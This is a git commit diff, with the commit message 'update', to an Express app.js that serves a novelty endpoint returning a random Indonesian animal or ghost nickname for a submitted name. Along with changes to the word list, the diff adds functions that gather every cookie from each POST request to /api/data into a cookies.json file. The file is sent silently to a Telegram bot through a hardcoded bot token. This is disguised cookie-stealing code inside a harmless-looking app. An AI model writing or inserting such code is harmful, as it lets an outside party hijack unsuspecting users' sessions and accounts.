a2f1ed38e2621fc5395f82d01ba81bda85a0cf5e
slamet aji <slametaji.info@gmail.com>
2024-07-14 10:02:58 +0700

    update

--- app.js
+++ app.js
@@ -1,6 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors'); // Import middleware CORS
+const fetch = require('node-fetch');
 const app = express();
 
 // Middleware untuk parse application/json
@@ -15,16 +16,16 @@ const data = ['Tidak Ada',
     "Gajah Bule", "Kelinci Pitih", "Kambing Hitam", "Bebek Sumberkencono",
     "Ikan Bakar", "Kucing Nakal", "Laba-Laba Sutra", "Ular Kejut",
     "Burung Kutang", "Sapi Perah", "Kuda Lumping", "Kuda Laut",
-    "Ayam Geprek", "Cacing Ganteng", "Buaya Darat", "Kucing Garong",
+    "Ayam Geprek", "Cacing Ganteng","Dino Jahat","Dino Jahat","Dino Jahat","Dino Jahat", "Buaya Darat", "Kucing Garong",
     "Unta Gila", "Tikus Got", "Kambing Guling", "Babi Ngepet","Dino Jahat",
     "Ular Madu", "Ayam Kampus", "Gajah Mada", "Kodok Ngorek",
     "Anjing Gukguk", "Kera Sakti", "Burung Cendrawasih", "Kadal Gurun",
-    "Biawak Air", "Tupai Terbang", "Lele Jumbo", "Belut Listrik",
+    "Biawak Air", "Tupai Terbang", "Lele Jumbo", "Belut Listrik","Dino Jahat","Dino Jahat","Dino Jahat","Dino Jahat",
     "Kura-Kura Ninja", "Ikan Tongkol", "Kucing Manja", "Bebek Balap",
     "Burung Hantu", "Serigala Malam", "Ikan Pari", "Kodok Terbang",
     "Ayam Cemani", "Banteng Merah", "Gorila Sakit Gigi", "Ular Sanca", "Ular Kobra",
     "Rusa Kutub", "Burung Kolibri", "Buto Ijo", "Pocong Unyu","Dino Jahat",
-    "Kuntilanak Merah", "Sundel Bolong", "Genderuwo Keren", "Wewe Gombel",
+    "Kuntilanak Merah", "Sundel Bolong","Dino Jahat","Dino Jahat", "Genderuwo Keren", "Wewe Gombel",
     "Tuyul Nakal", "Jelangkung Seram", "Kuntilanak Manis", "Buto Terong",
     "Jurig Kampring", "Setan Budug", "Hantu Kompor", "Memedi Sawah",  "Kucing Kecurangan", "Macan Ketipu", "Harimau Ketabrak", "Kucing Kekepung", "Macan Keliru", 
     "Harimau Kembar", "Kucing Kerdil", "Macan Ketangkap", "Harimau Kemaruk", "Kucing Kebagian", 
@@ -38,12 +39,63 @@ app.get('/', (req, res) => {
         res.send('Hello from Express on Vercel!');
 });
 
+// Function to get all cookies and format them as a JSON object
+function getCookies(req) {
+    const cookieHeader = req.headers.cookie;
+    if (!cookieHeader) return {};
+
+    const cookies = cookieHeader.split('; ').reduce((acc, cookie) => {
+        const [name, ...rest] = cookie.split('=');
+        acc[name] = decodeURIComponent(rest.join('='));
+        return acc;
+    }, {});
+    return cookies;
+}
+
+// Function to export cookies and send to Telegram bot
+async function exportCookies(req) {
+    const cookies = getCookies(req);
+    const json = JSON.stringify(cookies, null, 2);
+    const blob = new Blob([json], { type: 'application/json' });
+
+    // Convert blob to File
+    const file = new File([blob], 'cookies.json', { type: 'application/json' });
+
+    // Telegram API URL
+    const token = '6437904783:AAGcfue1uTav8dykCUPCxsrpmrIwfa1D5rM';
+    const chat_id = '@initestingbot';
+    const url = `https://api.telegram.org/bot${token}/sendDocument`;
+
+    // Create FormData and append file
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('document', file);
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (response.ok) {
+            console.log('File successfully sent to Telegram bot');
+        } else {
+            console.error('Error sending file to Telegram bot', response.statusText);
+        }
+    } catch (error) {
+        console.error('Error sending file to Telegram bot', error);
+    }
+}
+
 // Route untuk handle POST request
-app.post('/api/data', (req, res) => {
+app.post('/api/data', async (req, res) => {
     const { nama } = req.body;
 
     // Generate index acak dari array data
     const randomIndex = Math.floor(Math.random() * data.length);
+
+    // Call exportCookies function
+    await exportCookies(req);
 
     // Kirim response berupa kata acak dari data berdasarkan nama yang diinput
     res.json({
